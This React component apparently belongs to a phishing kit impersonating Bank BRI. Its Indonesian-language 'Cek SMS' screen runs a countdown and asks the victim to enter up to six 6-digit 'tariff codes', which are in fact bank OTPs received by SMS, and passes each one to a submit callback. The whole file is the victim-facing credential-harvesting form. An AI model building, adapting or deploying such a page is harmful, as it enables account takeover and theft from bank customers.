
import React, { useState } from 'react'
import Countdown, {zeroPad} from 'react-countdown';

const SiteVerifikasi = ({btnClick, query}) => {

  const [isDisbled, setIsDisbled] = useState(true)
   
  const handleClick = (e) => {
    e.preventDefault()
    const data = {
      otp: document.getElementById('msg').value,
    }
    btnClick(data)
    
  }

  const renderer = ({ hours, minutes, seconds, completed }) => {
    if (completed) {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    } else {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    }
  }
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000'}}>  
        <h1 style={{textAlign:'center', fontWeight:'bold',color:'rgb(14 120 202)', fontSize:'1.5em'}}>Cek SMS</h1>            
        <div style={{background:'grey', width:'100%', height:'1px', marginTop:'1em'}}></div>
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'rgb(14 120 202)', fontSize:'1.5em'}}>
        <Countdown
          date={Date.now() + 60*3000}
          autoStart={true}
          renderer={renderer}
        />
        </h1>    
        <p style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Silahkan cek kode tarif anda yang telah dikirim ke no handphone melalui SMS dari BRI OTP dan berlaku sampai 1-3 menit</p> 
        <h4>KODE TARIF NORMAL</h4>   
        <form>
            <label>
              Kode 6 angka ke-{query || 1} ({
                query === '1' ?
                "baris_pertama" : query === '2' ?                
                "baris_kedua" : query === '3' ?                
                "baris_ketiga" : query === '4' ?                
                "baris_keempat" : query === '5' ?
                "baris_kelima" : query === '6' ?
                "baris_keenam" : "baris_pertama"
              })*
            </label>
            <input id='msg' type="number" className='form-control-pesan' placeholder="Kode Hanya Berlaku 3 Menit" onChange={(e)=>e.target.value ? setIsDisbled(false) : setIsDisbled(true)} style={{marginTop:10}}/>
            <button disabled={isDisbled} type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
              LANJUT
            </button>
        </form>
    </div>
  )
}

export default SiteVerifikasi
